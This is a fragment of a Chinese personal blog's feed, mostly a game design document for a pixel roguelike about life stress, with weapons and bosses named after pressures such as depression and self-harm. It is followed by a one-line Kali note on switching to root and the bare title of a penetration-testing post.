        <content type="html"><![CDATA[<p>这个游戏企划叫做《再施加压力我就死》《压力爆表》</p><p>其他名字《勇往直前》《前进》</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>永远记住，不要把事情复杂化，越简单越好，剧情也是，做人也是，团队管理也是，那些复杂的东西隐藏在背后就好了</p><h2 id="构思来源"><a href="#构思来源" class="headerlink" title="构思来源"></a>构思来源</h2><p>我的想法是，现如今的社会，人们总是受到来自各个方位的压力施加，来自家人，来自朋友，来自同事，似乎是一个永远不会停止的怪圈，身处这样的社会，不难免产生消极的情绪，但是却要隐藏。</p><p>我觉得现在的年轻人都过于努力，甚至不惜伤害自己的身体，对我而言，其他人如何批判自己没有太多的影响，我更想要呆在家人的身边，啃老也好，被骂也罢，人生本来就短暂，多陪陪自己的亲人，不要让以后的自己追悔莫及。</p><p>讽刺的是，抑郁似乎变为了一种调侃，不再是针对一些人的特殊病情，而是整体抑郁，网抑云，emo等词汇也被冒出。</p><p>这是一个集体“抑郁”的时代，但真的抑郁吗？</p><p>人们总是分不清，难过，悲伤，抑郁的区别。</p><p>痛苦和悲伤总是每天都存在，人们理所应当的认为这是抑郁，但是真正的抑郁是什么？它真的会被表现出来吗？</p><p>我认为不是的，我甚至不清楚自身是不是抑郁患者，但是我不知为何心里存在着一种无法言说的情感。</p><p>回到主题，人并不是无法承受压力，而是无法承受自己承认的压力，如果自己认可了，那么一切即使再累也可以承担，但如果自己不认可，即使是一件小事也会引发巨大的爆炸。</p><p>我希望通过游戏让玩家意识到压力究竟是什么样子的，不在被压力掌控，战胜压力，勇往直前，生活很难，但要充满希望和自信。</p><p>我会借鉴目前世界级别的开放世界游戏，饥荒，星露谷，我的世界，泰拉瑞亚，做一款中国的游戏，让全世界都看到，产生共鸣。</p><p>一个涉及到压力和平衡的,与自我达成和解。</p><h2 id="一些话语引发的思考"><a href="#一些话语引发的思考" class="headerlink" title="一些话语引发的思考"></a>一些话语引发的思考</h2><p>对于这部番我想说什么，悲剧是把最有价值的东西毁灭给你看，前半部分的幸福正是为了后半部分的悲剧，也许看过太多催泪番，对于情绪已经有很好的把控。讲真，四月和未闻虽然戳中了我心中柔软的地方，但绝对没有八音盒带给我的感触大，敬一郎最初看到小花也许只是一种同情或许只是为了排解寂寞，但在以后的相处，两人之间产生的是亲情，小花为了改变敬一郎的寂寞，让敬一郎能够想从前那样开朗，敬一郎也发现小花在自己心中的地位越来越重，很开心看到敬一郎最后重拾音乐，虽然他的生活还是寂寞的，但他已经改变自己，结尾是神作，瞬间升华了全剧，是敬一郎看着八音盒露出的温柔，也是小花面朝大海的镜头，看到最后三秒，眼泪还是下来了。</p><p>悲剧是把最有价值的东西毁灭”这句话似乎是知乎上对key社作品的评价……在短片里我觉得这部动漫虽然无法与星之梦比肩，不过还是十分优秀的了……</p><p>真实不真实并不重要，只要舞台上的故事精彩就好了</p><p>人与人都是相互链接的</p><h2 id="做梦产生的灵感，在想能不能用的上"><a href="#做梦产生的灵感，在想能不能用的上" class="headerlink" title="做梦产生的灵感，在想能不能用的上"></a>做梦产生的灵感，在想能不能用的上</h2><p>今天做了一个梦，梦中，有我曾经的老师，还有同学们，一开始可能是由于我的自大，被这些人轮流欺负，我想进去我的作为，而他们用桌子挤我让我进不去，然后我就很难过，流泪了，之后老师还用我举例，但这些都不重要，突然不知道为什么，一切都重来了，这一次我谦虚面对，然后一切都变的顺利起来，回到了我的座位，我以为一切都正常了，但其实这座学校是一个巨大的试验场，我们开始逃离，我身边的人一个紧接着一个死亡，最后所有我讨厌的，我喜欢的，都为了帮助我奉献出了自己最珍贵的东西，助我逃离了这个地方。</p><p>梦是如此，但引发的思考让我想到了一个有趣的世界观，这个世界观里的人都知道自己所呆的地方是虚幻的，但为了配合演习日复一日，有人扮演黑脸，有人扮演白脸，一开始玩家是看不出来的，到后面发现后，曾经憎恨的人的真相，一同面对这个世界，人们献出神器，破坏整个虚幻的世界。</p><p>我和同学们被带到了缅甸就业，一开始大家都觉得肯定是骗子，就吵吵的要回家，但是看到别人拿到了钱，然后不知道为什么就决定要进去看看，我说我们就在这里等公交车然后回家就行，但是没人愿意听我的，最后我一个人经历万险回到了我的家。我依稀记得我的是自己游回去的。</p><p>参考资料:</p><p>1.七宗罪</p><h2 id="策划"><a href="#策划" class="headerlink" title="策划"></a>策划</h2><p>游戏采用2d+肉鸽+像素</p><p>虽然一开始我想做横板2D，但是我看了很多吸血鬼幸存者2D风格的视频后，决定改为八个视角的2D像素肉鸽类游戏。</p><p>虽然是肉鸽类游戏，但是我也加入一些必要的生存类要素，有一个生态世界，里面的物品可以不断循环，熟悉世界和物品后可以自给自足，如果玩家选择迈出世界，那么正式开始压力冒险。</p><p>玩法上，人物操控的角色有两个槽</p><p>一是血槽 </p><p>二是压力槽</p><p>玩家可以随机再地图中捡到刷新的压力武器，装备压力武器会增加压力槽，如果装备的武器超出了压力槽，那么玩家会再10秒内原地爆炸。</p><p>核心玩法就是刷怪，和千奇百怪的武器类型，目前我想到的武器比如 催婚 工作 学习 抄写 抑郁 等等</p><p>压力武器之间也有等级划分</p><p>等级按低到高分为 普通 低压 高压 致死 </p><p>压力条是100% 有有一些致死的武器装备压力就会增加110%超出界限了，这时候就无法装备，想要装备这种特殊的武器，需要满足条件，获取安慰武器，这类武器没有伤害，但是可以抑制压力条，有一些是永久增加，有一些是只能抑制一段时间，比如</p><p>妈妈的汤 是一个可以抑制100%压力槽的药水，喝下后可以再200s内自动抑制压力，这时候就可以装备致死武器，致死武器的威力异常强大。</p><p>当然也有一些特殊装备可以抑制，比如装备一个”眼镜“效果是可以装备致死武器300s,这代表你可以装备它，300s后就需要丢出去了，单人模式情况下，只能直接丢出去，但是如果是双人，可以扔给队友，然后循环使用。</p><p>武器连携系统：通过装备两个有关联的武器，可以造成更高的伤害。</p><p>除了这些特性，剧情方面则显得深沉许多，我希望设置一个比较Q版的形象，是为了更好的迎合市场的审美，但是故事却让人深思，比如经典的肉鸽游戏《以撒的结合》Q版的形象，即使你不了解游戏背景故事，依然可以完，但是如果你了解故事后，带来的深刻深思也很让人感触。</p><p>这正是好游戏的品质。</p><h2 id="游戏流程"><a href="#游戏流程" class="headerlink" title="游戏流程"></a>游戏流程</h2><p>开局十天 可以了解背景故事 和 NPC做交互，同时也是为了自己熟悉游戏制作和确认基本游戏框架</p><p>十天后 世界毁灭，开始高自由探索</p><h2 id="市场调研"><a href="#市场调研" class="headerlink" title="市场调研"></a>市场调研</h2><p>在手游市场中，目前是没有向我这样的一款游戏，或者说曾经有一款，叫做元气骑士，而它的成功也可见，但我的游玩要素和它不一样，元气骑士是地下城的<strong>Roguelike</strong>，而我则想偏向泰拉瑞亚和饥荒的生存类型。</p><p>但有一点我比较认可元气的做法，那就是元气骑士一个人玩是没意义的，正是因为朋友的出现，让游戏更加有趣，而我也希望制作一款目标就是能和朋友，或者有一个圈子的游戏。</p><h3 id="付费意愿"><a href="#付费意愿" class="headerlink" title="付费意愿:"></a>付费意愿:</h3><p>针对不同的游戏应该提供不同的付费内容，这个内容不能影响游戏的平衡和机制，和以前的传奇，暴打屌丝的游戏不同，这种类型的游戏主要是输出内容，有内容不怕没人买单，所以一般都是买断制，这点类似于电影的手段，主要是给用户留下一个美好的回忆。</p><p>再次基础上，第二盈利手段则是IP化，有了品牌的加持，会带来更多的盈利机会。</p><p>最好阶段是创建用户群体肖像，累计用户群体，并且不断优化。</p><h2 id="背景故事"><a href="#背景故事" class="headerlink" title="背景故事"></a>背景故事</h2><p>“如果我们曾经热爱的一切都将消失不见，那么为何还要努力的前进呢？”</p><p>站立在苦难和怪物面前的是一个孩子，它眼神坚定，手紧握着希望，怪物后面的路蜿蜒曲折，通向未知的黑暗。</p><h3 id="故事主角"><a href="#故事主角" class="headerlink" title="故事主角"></a>故事主角</h3><p>故事的主角是一个孩子，它一无所知，没有什么建树，也不曾想获得什么，只是希望能一直呆在木桶里。</p><p>这里的典故出自犬儒派哲学家：</p><p>第欧根尼</p><p>“行为艺术”是后现代的时髦玩意。但闲读哲学史，却发现了一位古代的“行为哲学家”。这正是应了<a href="http://www.hudong.com/wiki/%E9%BB%91%E6%A0%BC%E5%B0%94">黑格尔</a>的那句老话：太阳底下没有新东西。<br>  这位“行为哲学家”就是犬儒派哲学家西诺布<a href="http://www.hudong.com/wiki/%E7%9A%84%E7%AC%AC%E6%AC%A7%E6%A0%B9%E5%B0%BC">的第欧根尼</a>（Diogenes 约公元前404—前323年）。他的“标志性”的“行为”就是在木桶里过夜。因此被称为“住在木桶里的哲学家”。<br>  苏格拉底死后，他的学说为柏拉图所继承。除柏拉图外，受苏格拉底影响的还有犬儒学派、昔勒尼学派和麦加拉学派。这三个学派因其影响相对较小，故统称小苏格拉底学派。犬儒学派的首创者为雅典的安提斯泰尼，而最有名的代表就是第欧根尼。<br>  第欧根尼生于约公元前404年，卒于公元前323年。据说他是银行家的儿子，却放弃了万贯家产，栖身于一只大木桶中晒太阳，捉虱子，思考哲学问题。他住在木桶里过夜，固然有刻意追求怪诞以引人注意的一面，但更主要的是为了用自己的“行为”表达犬儒派的“哲学”思想。<br>  第欧根尼有一句名言：“重估一切现存价值”。他认为，文明的主要价值如“高贵的门第、声誉和一切显赫的东西”都是“浮夸的罪恶装饰品”，金钱是一切罪恶的渊源。“自然”比“文明”更为真确，所以应该返归自然，遵从自然，抑制一切人为的欲望追求，以简陋俭朴的生活刻苦磨练自己。只有这样，人才能有个人的心灵自由。而一味追求快乐，只会走向快乐的反面。<br>  出于这样一种哲学观点，第欧根尼对一切崇尚文明的观点都作了无情的批驳和辛辣的讽刺。古希腊智者普罗泰戈拉提出一种观点：人因为身体柔弱，不像其他动物有皮毛羽翼保护，所以需要文明。第欧根尼反驳道：青蛙皮肉柔软也能生存，原始人没有火、衣服、皮革、盔甲等等，也同样能生存。他认为普罗米修斯盗火给人类，是人类“文明”的开始。“火”与“文明”是使人类趋向柔弱奢侈生活的根本原因，因此宙斯把普罗米修斯锁在高加索山上受苦是他罪有应得。<br>  为了实践自己的学说，第欧根尼过着一种放荡不羁、粗鄙不堪的生活方式。一根橄榄枝，一件褴褛的外衣，一个讨饭袋，白天到处游荡，夜晚或睡神庙，或睡市场，或睡在木桶里，居无定所，随遇而安，这就是他的生活写照。正因为如此，他获得了“犬”的外号，他的学派也被称作“犬儒学派”。但他不在乎别人的评头品足，说决心理直气壮地像一条狗一样活下去！一次第欧根尼看到一个小孩用手捧水喝，他说“一个小孩在生活俭朴方面打败了我”，于是便把自己的水杯从背袋里拿出来扔了。另有一次，他看到一个打碎了盘子的小孩用一块面包的空心部分来盛扁豆，于是把自己的碗也扔了。有一天，第欧根尼在市场以啃菜根充当早饭，许多人围观并叫嚷“狗”。他喊道：“你们才是狗，围着看我吃早饭。”有两个人要走，他又喊：“不要怕，狗是不喜欢甜菜根的。”<br>  第欧根尼虽然过着粗鄙不堪的生活，却不以为耻，反而以此而感到自豪。亚历山大听说第欧根尼的故事后，意欲屈尊赏赐。他站在第欧根尼面前说：“我是亚历山大，伟大的皇帝。”第欧根尼不卑不亢地答道：“我是第欧根尼，犬儒派。”亚历山大说：“你可以向我请求你要的任何恩赐。”回答是：“那就请让开，不要挡住我的阳光。”亚历山大叹道：“我若不是亚历山大，必做第欧根尼！”一次亚历山大问道，为什么别人称他为狗。他回答说：“我向那些给我东西的人摇尾乞怜，向不给我东西的人张牙舞爪。”还有一次亚历山大大帝问他：“你不怕我吗？”他反问：“你是什么？是好人还是坏人？”亚历山大大帝回答说：“是好人”。他说： “有谁会害怕好人呢？”有人提醒他西诺布人判了他流放，他说：“我，判他们呆在国内。”他还说：“正是通过流放我才成了哲学家。”<br>  据说第欧根尼一次在大白天打着灯笼四处走，别人奇怪而问之，他说他在找“人”。当然，他要找的并不是作为雅典公民的人，而是摆脱了主流伦理束缚的真实之 “人”，即区别于“文明人”的“自然人”。<br>  第欧根尼虽然放浪形骸、落拓不羁，却是一位学者、哲学家。据记载，他写过14篇对话，7部悲剧，可惜早已佚失。我们今天已无缘领略他独特的哲学思想和风采，只能通过历史上的有关记载约略知道他的“行为哲学”及其所体现的哲学思想。</p><h3 id="故事背景"><a href="#故事背景" class="headerlink" title="故事背景"></a>故事背景</h3><p>在一座小岛屿上，有一位住在木桶里的年轻人，被突如其来的人打扰，这个人自称神明，说能给予他一切，年轻人不知道自己想要什么，纠结半天后，神明说如果你想好了可以通过这个联系我，说完后丢下了一个物品。</p><p>年轻人在桶里思索了好一会，决定要不要出去。</p><h2 id="测试版内容"><a href="#测试版内容" class="headerlink" title="测试版内容"></a>测试版内容</h2><h3 id="更新版本-1-0"><a href="#更新版本-1-0" class="headerlink" title="更新版本:1.0"></a>更新版本:1.0</h3><p>目前的测试版计划</p><p>创建人物形象</p><p>创建人物站立状态动画</p><p>创建人物行走状态动画</p><p>创建人物奔跑状态动画</p><p>创建海岛</p><p>创建椰树</p><p>创建NPC指导小姐</p><p>构思人物背景故事 【已完成】</p><p>游戏基础框架 如 一个地图 一个Boss 背包栏 可操控模型 物理碰撞 提取物品 丢弃物品 时间系统</p><p>武器方面： 5个普通武器 10个低压武器 5个高压武器 3个致命武器</p><p>敌人： 敌人我希望有参考现实映射， 可以是一些怪物，也可以是一些看似可爱但是很凶残的生物</p><h2 id="核心系统"><a href="#核心系统" class="headerlink" title="核心系统"></a>核心系统</h2><h3 id="世界种子"><a href="#世界种子" class="headerlink" title="世界种子"></a>世界种子</h3><p>当你通关世界后，世界分崩离析，留下的只剩一个种子，这是这个世界曾经存在的证明，去其他人的存档通关后，也会获得一个种子，所有种子都保存在主页的成就中…..</p><p>当你收集足够多的世界种子后</p><h4 id="世界Boss"><a href="#世界Boss" class="headerlink" title="世界Boss"></a>世界Boss</h4><p>“你不曾放弃”</p><p>“但在这硕大的世界中，渺小的你又能做到什么？”</p><p>“来吧…”</p><p>“向我证明…”</p><p>“你 的 决 心”</p><h4 id="作弊版Boss"><a href="#作弊版Boss" class="headerlink" title="作弊版Boss"></a>作弊版Boss</h4><p>每次开始游戏会保存当前的时间戳，然后关闭游戏同样也是会保存时间戳，通过这两条数据获得游玩时间。</p><p>种子的生成也会根据时间生成唯一种子，当玩家靠作弊刷取足够的种子后，会出现同样作弊的Boss</p><p>“看来有些人通过不正规的手段来到了这里….”</p><p>“脆弱的灵魂…..”</p><p>“根 本 不 值 一 提”</p><p>当你</p><h3 id="人物养成系统"><a href="#人物养成系统" class="headerlink" title="人物养成系统"></a>人物养成系统</h3><p>目前开始只能选择一个角色，后面我想要增加更多不同的角色，就像饥荒一样。</p><p>目前我有两个想法不知道该选择哪个。</p><p>第一：玩家第一次出现在世界上的时候，是一个幽灵形态，这个形态想要对世界产生互动，需要附生于其他生物，这代表这个世界所有的生物都是可以附生的，但是有附生值，就是不同强大的灵魂没办法轻易附生，玩法将由这个核心功能为底，去拓展衍生。</p><p>第二: 将附生设置为一个道具，可以转身成其他种族，获得更高的初始属性。</p><p>第三: 死亡后则是永远的死亡，身为不属于这个世界的你，化身为强大的灵魂，想要再度踏上冒险只能附生于他人。</p><p>玩家的真实形态是幽灵，最终能保存的只有一道道伤痕，这些伤痕是战斗的证明，经验是玩家的武器。</p><h3 id="武器融合系统"><a href="#武器融合系统" class="headerlink" title="武器融合系统"></a>武器融合系统</h3><p>如同泰拉瑞亚中的武器一样，低阶的武器意义不只是为了度过新手期，同时可以不断融合升级，直到达到其中一条分支的顶峰，每个顶峰都代表一种终极系武器，除此之外，也可以另辟蹊径的合成，解锁更多分支的武器，所有武器融合出当前系列通关武器——无尽，无尽可以吞噬所有武器，并且不会再变换形态，只会不断增加变态的数值。</p><h3 id="世界敌方生成系统"><a href="#世界敌方生成系统" class="headerlink" title="世界敌方生成系统"></a>世界敌方生成系统</h3><p>设想，自己的科技和武力值增加，面对未知的怪物也会变强，这是世界的自我调整，用来对抗那些用卑鄙办法增强的玩家，玩家存在一种压力值的数值，随着数值的不断提高，意味着玩家不断变强，不断忍受压力，同时世界获取到玩家的数值后，生成相应的怪物，和随机事件，不同于这个世界原来的居民，如果推出联机版后，当原住民玩家的世界遭受到其他玩家的袭击，也会产生不同的变化，比如，一个新手的档，来了一个通关的老玩家，拿着世界最强的武器“无尽”，他的压力值和当前世界的玩家根本不是一个级别，那么世界为了制衡，会生成压力Bug级别的Boss，我称之为000，虽然是一个老人的样貌，但是攻击对于破坏平衡的人来说，将是秒杀的，对原住民则是普通伤害，攻击力会是，当前玩家压力值*2，目前来说这是粗略的想法，但我的本意是设计出对抗联机作弊者的方法，保护普通玩家的游玩体验，<strong>同时，这也是一个获取到特殊武器的方法</strong>，有待思考。</p><h3 id="岛屿生存系统"><a href="#岛屿生存系统" class="headerlink" title="岛屿生存系统"></a>岛屿生存系统</h3><p>玩家一开始出生在一座海岛上，这是一座非常小的岛屿，虽然岛屿小，但是拥有几乎循环的生态机制，可以供玩家生存。</p><h3 id="岛屿经济系统"><a href="#岛屿经济系统" class="headerlink" title="岛屿经济系统"></a>岛屿经济系统</h3><p>当发展到达一定程度，已经不在满足单纯的生存，而是追求更高层次的生活，转而产出资本。</p><h3 id="符咒系统"><a href="#符咒系统" class="headerlink" title="符咒系统"></a>符咒系统</h3><p>玩家可以通过画符在前期获得异常的能力，与之相对的是对道家的理解深刻才可以做到，我希望可以有一个自创的符咒结合真实的画法，可以实现召雷，召雨，提升气运等，想要画出系统认可的符咒，需要满足两个条件，第一是画符的时候，要根据当前的坐标，算出雷击的时间，然后划到符咒里才算，所以里面的画符师是很难的职业。</p><h3 id="联机模式"><a href="#联机模式" class="headerlink" title="联机模式"></a>联机模式</h3><p>在联机模式中，除了默认的主角男木桶,会在周围生成一个新岛屿，里面有一个同样的粉色木桶</p><h3 id="彩蛋收集系统"><a href="#彩蛋收集系统" class="headerlink" title="彩蛋收集系统"></a>彩蛋收集系统</h3><p>解锁不同的彩蛋，最终会获得不同的奖励，同时彩蛋也作为成就的一环，是迈向下一关的证明，解决所有彩蛋，或者隐藏彩蛋后，最终触发新机制，或者获得新的奖励。</p><p>训鹰系统</p><p>训练生物是人类历史上最重要的一点，提高生产力，同时相互合作，早就了自然和人类的平衡。</p><p>在游戏中，通过捕捉生物和驯化生物，可以获得宠物。</p><p>我在考虑是否加入宠物生产，这样训练好的宠物可以攻击，可以携带物品给队友，或者其他提高生产力的功能。</p><p>我的灵感来源于</p><p><a href="https://www.bilibili.com/video/BV1F841117LW/?spm_id_from=333.337.search-card.all.click&amp;vd_source=abe874765029f161994b8d5302deb166">https://www.bilibili.com/video/BV1F841117LW/?spm_id_from=333.337.search-card.all.click&amp;vd_source=abe874765029f161994b8d5302deb166</a> —— 最后的鹰把式</p><p>所以训练成功的动物，玩家可以选择是否放生，如果放生，那么来年会有更多的物种和动物出现，如果不放生，则会实打实的减少一个动物的生成量。</p><h3 id="作弊检测系统"><a href="#作弊检测系统" class="headerlink" title="作弊检测系统"></a>作弊检测系统</h3><p>“你这个肮脏的封弊者…”</p><p>“来吧，打败我！”</p><p>当检测到玩家的攻击力和金币出现异常增加的时候，会被系统传送到审判殿堂，这时候会有BOSS审判作弊的玩家</p><p>前期作为一个保护游戏平衡的系统，但后期会在剧情上和玩法上给予新的高度</p><h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><h3 id="犬儒"><a href="#犬儒" class="headerlink" title="犬儒"></a>犬儒</h3><p>年轻人决定再呆一会，一缕阳光照进桶里，这一瞬间，他仿佛解开了史上最伟大的哲学命题。</p><h3 id="爱从来都不是身外之物"><a href="#爱从来都不是身外之物" class="headerlink" title="爱从来都不是身外之物"></a>爱从来都不是身外之物</h3><p>出自《<em>尽管我们的手中空无一物</em>》（《仆らの手には何もないけど》）是收录于《仆らの手には何もない》中的一首歌曲</p><p>本体是一件白色的羊毛衣</p><p>制作方法:制作羊毛衫有几率制作出，使用纸皇冠则增加制作概率。</p><h3 id="面具"><a href="#面具" class="headerlink" title="面具"></a>面具</h3><p>使用面具可以变成其他虚拟主播Vup or Vtb,想要联动的角色有：</p><p>米虫 </p><p>东雪莲 </p><p>神乐meu </p><p>Gawr Grua </p><p>Neuro-sama</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="人物移动"><a href="#人物移动" class="headerlink" title="人物移动"></a>人物移动</h3><p>人物使用WASD移动</p><h3 id="射击"><a href="#射击" class="headerlink" title="射击"></a>射击</h3><p>在PC端通过<strong>鼠标移动</strong>确定射击位置后<strong>左键</strong>进行射击</p><h3 id="投降"><a href="#投降" class="headerlink" title="投降"></a>投降</h3><p><strong>长按Y</strong>投降，投降的时候周围敌方会<strong>放松警惕</strong>，这时候可以看时机突袭开枪，投降有两种情况，可以扔掉当前武器，此时投降会让敌方减少大幅度警惕，乘机使用另一把武器突袭，如果只有一把武器，那么将无法突袭，或者选择将弹夹下移，突袭后快速装弹夹射击</p><h3 id="换弹夹"><a href="#换弹夹" class="headerlink" title="换弹夹"></a>换弹夹</h3><p>按R换弹</p><h3 id="切换武器"><a href="#切换武器" class="headerlink" title="切换武器"></a>切换武器</h3><p>按Q切换武器，在普通情况下人物只能携带两把武器，一把在背上一把在手上，使用特殊物品可以增加武器槽</p><h2 id="武器构想"><a href="#武器构想" class="headerlink" title="武器构想"></a>武器构想</h2><h3 id="幻想级别"><a href="#幻想级别" class="headerlink" title="幻想级别"></a>幻想级别</h3><p><strong>神经元</strong>   ？？？  </p><p>“杀了他，顺便杀了我”</p><p>可以漂浮再四周的基因序列，会自动攻击，同时可以迷惑他人，长按后释放一次巨大冲击，清屏攻击，并且所有怪物都会着火，对BOSS会造成巨大伤害。</p><p><strong>负一点五</strong>   ？？？</p><p>“哈哈哈哈哈”</p><p>一个计算器，点击后可以弹出数字，数字碰到他人后会造成伤害，数字是随机的，数字弹出后会在地上停留数十秒，有时候会弹出加减乘除的符号，这时候如果碰到其他数字就发生改变，融合，此时打出高额伤害，比如发射了5，对怪造成了5点伤害，然后弹出了乘号，碰到5后会爆炸产生10点伤害，同时10可以捡起来，如果碰到负号，那么就变成-5，也可以捡起来，如果把两个都捡起来，就会自动计算，10+-5，并且得出答案5，标注在头顶上，此时每次攻击的伤害都会+5，这样看来是可以成长的武器，到后面完全可以变成99999，但是如果加减后变成-1.5，那么计算器会变成炮弹，被射中的敌人直接秒杀，只能使用一次，针对所有Boss都可以用。</p><h3 id="致死级别"><a href="#致死级别" class="headerlink" title="致死级别"></a>致死级别</h3><p><strong>以死相逼</strong> 致死级别 增加110%压力</p><p>”看来我还是没有长大啊….最后还是用死去逼着家人“</p><p>一把站着血的菜刀 菜刀上面印着四个大字”民族英雄“（ps：致敬周星驰的电影《国产凌凌漆》），点击后会砍向自己，然后喷出血液，血液呈直线喷出，并且自带毒性，持续造成伤害。</p><p><strong>抑郁</strong> 致死级别 增加110%压力</p><p>”说到底还是没有任何人理解我…“</p><p>这是一把高攻击力的狙击枪，射出的是眼泪，蓝色子弹，单发伤害极高，长按蓄力后，可以喷水，水流如同激光一样，并且可以遇到物体后反射伤害，需要注意的是，如果反射伤害碰到自己，会造成击退，和少量伤害。</p><h3 id="高压级别"><a href="#高压级别" class="headerlink" title="高压级别"></a>高压级别</h3><p><strong>别人家的孩子</strong> 增加50%压力</p><p>“你看看别人！再看看你自己！”</p><p>一面镜子，可以反射别人的攻击，同时可以复制敌人的攻击模式，一共有三次机会，武器的优点是，它甚至可以复制Boss的技能，长按可以吸收攻击，有一个套路是如果是联机模式，可以让同伴攻击自己，然后自己再合适的时间可以再 反射回去技能伤害。</p><p>之所以它没有致死级别，原因在于，如果复制Boss的技能，有几率失败，三次都失败后镜子破碎，同时自己的压力值会永久增加10%，这一点比较鸡肋，所以才列入了高压级别，倘若复制成功，那么会是一把拥有致死级别攻击力，但是可以一直使用的神器！</p><p><strong>失业</strong> 增加50%压力</p><p>“工作好难找”</p><p>当下社会工作难找 却还被父母认为不够努力 真是有苦说不出呀</p><h3 id="低压级别"><a href="#低压级别" class="headerlink" title="低压级别"></a>低压级别</h3><p><strong>催婚</strong> 增加10%压力</p><p>“我还想早日抱上孙子嘞”</p><p>一个魔法变身棒，使用后会身穿婚纱，提供属性Buff加成。</p><h3 id="普通级别"><a href="#普通级别" class="headerlink" title="普通级别"></a>普通级别</h3><h2 id="友方"><a href="#友方" class="headerlink" title="友方"></a>友方</h2><h3 id="玩家"><a href="#玩家" class="headerlink" title="玩家"></a>玩家</h3><p>普雷尔 （Player）</p><p>玩家真正的名字，一些认识玩家的人会称呼玩家是不是普雷尔，如果说不是，就会说认错了，但你和他长的很像。</p><h2 id="中立"><a href="#中立" class="headerlink" title="中立"></a>中立</h2><h2 id="敌方"><a href="#敌方" class="headerlink" title="敌方"></a>敌方</h2><h3 id="普通小怪"><a href="#普通小怪" class="headerlink" title="普通小怪"></a>普通小怪</h3><h3 id="精英怪"><a href="#精英怪" class="headerlink" title="精英怪"></a>精英怪</h3><h4 id="负债"><a href="#负债" class="headerlink" title="负债"></a>负债</h4><p>债务让我们自卑，让我们变成奴隶，攻击后会出现锁链和手铐，这时候玩家会无法操控角色，等待几秒后才能继续操作。</p><h3 id="BOSS"><a href="#BOSS" class="headerlink" title="BOSS"></a>BOSS</h3><h4 id="癌"><a href="#癌" class="headerlink" title="癌"></a>癌</h4><p>癌是人们最不愿意接收的信息，癌症侵蚀着身体的一切，夺走我们爱的一切。</p><p>被癌碰到的玩家会获得持续的掉血Buff，每隔20s，癌会吼叫，再范围内的人，将会收到精神冲击，连续三次就会死亡，中招则会彩虹闪屏，癌的样子，酷似一条龙，但是分不清头和尾，因为两边都是头，如果遇到伤害，有时候会分散，变成无数的虫子，这时候或许是最弱的时候。</p><p>召唤方法：</p><h4 id="自残"><a href="#自残" class="headerlink" title="自残"></a>自残</h4><p>自残是一双手，但它其实并不会攻击玩家，被它抓住后，数十秒会被甩飞出去，之后头上会出现印记，每到晚上的时候，玩家就会因为自残而扣血，持续三天后印记消失，或者玩家可以通过一些道具来消除效果。</p><p>召唤方法：通过特殊道具，美工刀召唤</p><h1 id="剧情"><a href="#剧情" class="headerlink" title="剧情"></a>剧情</h1><h1 id="结局"><a href="#结局" class="headerlink" title="结局"></a>结局</h1><h2 id="我就是我"><a href="#我就是我" class="headerlink" title="我就是我"></a>我就是我</h2><p>玩家回到了最初的小岛，这里还残留着曾经破坏的痕迹，被砍伐的椰树，岛上的垃圾，玩家清理了垃圾，重新种了一棵椰树，造了一个木桶，钻了进去。</p><p>在白天不曾出现的指导小姐也出现在了玩家面前，又开始侃侃而谈，他抱怨着玩家破坏了白天和黑夜的平衡，看似拯救了世界，打败了怪物，但造成了多少的麻烦。</p><p>你说到，还记得我刚来到这里的时候，你说你很重要的人离开了，他叫做普雷尔，和我长的很像，现在我知道普雷尔是谁了。</p><p>“指导小姐！你为什么要说这样的话”</p><p>“我认为我没说错呀，我确实很重要的人不见了，希望你帮我找到他”</p><p>“但他？是我不是吗？只是我失去记忆了”</p><p>“是你，谢谢你帮我找回了他”</p><p>“？？？，我不是很明白你的意思”</p><p>“我重要的人确实不见了，他躲在木桶里，不愿意出来”</p><p>“有一天，他决定离开，踏上冒险”</p><p>“遇到什么困难都不愿意放弃”</p><p>“永远充满了决心”</p><p>“最后他回到这里，又回到了木桶里”</p><p>“但这次，他是凭借自己的意识，回到木桶里的，和那个躲在木桶里的人不一样”</p><p>“……”</p><p>“谢谢你…..谢谢你帮我找回了普雷尔….”</p><p>“当然，也谢谢你”</p><p>（这时候有两个选项，分别是：1.阿？你又在谢谁？ 2.嗯…）</p><p>“…谁？”</p><p>“你”</p><p>解析：我希望营造出一种特殊的感觉，指导小姐找回了他重要的人，普雷尔，玩家找回了自己，这个过程指导小姐对应的是自己，那个迷茫的自己，而普雷尔是内心深处的自己，这段旅程也是人们找回了自己，我就是我，聆听内心真实想法的时刻，也是对自己道谢。</p><p>其实，在这个世界，我们最应该感谢的人就是我们自己，所以指导会真心的感谢玩家。</p><h2 id="没能接听的电话"><a href="#没能接听的电话" class="headerlink" title="没能接听的电话"></a>没能接听的电话</h2><p>那人想着，或许是我的问题，还是再打个电话过去吧，抱着这样的情绪，拨通的电话，但是电话那头已经没人再接收，就这样，曾经的铃声再一次响起，只不过这次，只剩下这铃声了。</p><p>如果要做PV的话，我希望用这个结局做宣传PV</p>]]></content>
      
      
      
        <tags>
            
            <tag> 作为日记加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kaili操作指南</title>
      <link href="/NANABLOG/2024/02/27/kaili%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/"/>
      <url>/NANABLOG/2024/02/27/kaili%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>通过使用 <strong>su</strong> 进入 <strong>root</strong> 模式 <strong>exit</strong> 退出</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试之APR断网</title>
      <link href="/NANABLOG/2024/02/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BAPR%E6%96%AD%E7%BD%91/"/>
      <url>/NANABLOG/2024/02/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BAPR%E6%96%AD%E7%BD%91/</url>
      
